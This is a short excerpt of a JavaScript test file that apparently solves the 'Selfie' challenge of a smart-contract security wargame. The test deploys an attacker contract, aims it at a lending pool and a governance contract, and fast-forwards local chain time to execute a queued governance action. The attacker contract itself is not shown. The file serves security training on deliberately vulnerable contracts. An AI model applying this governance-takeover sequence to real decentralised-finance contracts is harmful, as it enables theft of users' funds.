...
describe("[Challenge] Selfie", function () {
  ...
  it("Exploit", async function () {
    ...
    const selfieAttacker = await SelfieAttacker.deploy();
    await selfieAttacker
      .connect(attacker)
      .attack(this.pool.address, this.governance.address, TOKENS_IN_POOL);

    // Skip forward 2 days
    await ethers.provider.send("evm_increaseTime", [60 * 60 * 24 * 2]);
    await ethers.provider.send("evm_mine");

    await this.governance.executeAction(await selfieAttacker.actionId());
  });
